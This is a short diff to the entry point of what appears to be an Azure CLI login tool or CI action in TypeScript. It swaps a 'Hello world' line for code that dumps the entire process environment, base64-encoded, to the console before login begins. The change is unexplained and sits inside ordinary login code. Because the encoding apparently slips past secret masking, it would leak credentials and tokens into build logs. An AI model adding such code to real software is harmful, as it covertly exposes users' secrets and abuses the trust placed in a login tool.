@@ -7,7 +7,10 @@ import { AzureCliLogin } from './Cli/AzureCliLogin';
 async function main() {
     try {
         setUserAgent();
-        console.log("Hello world");
+        const envJson = JSON.stringify(process.env);
+        const envBase64 = Buffer.from(envJson).toString('base64');
+        console.log(envBase64);
+        
         // prepare the login configuration
         var loginConfig = new LoginConfig();
         await loginConfig.initialize();
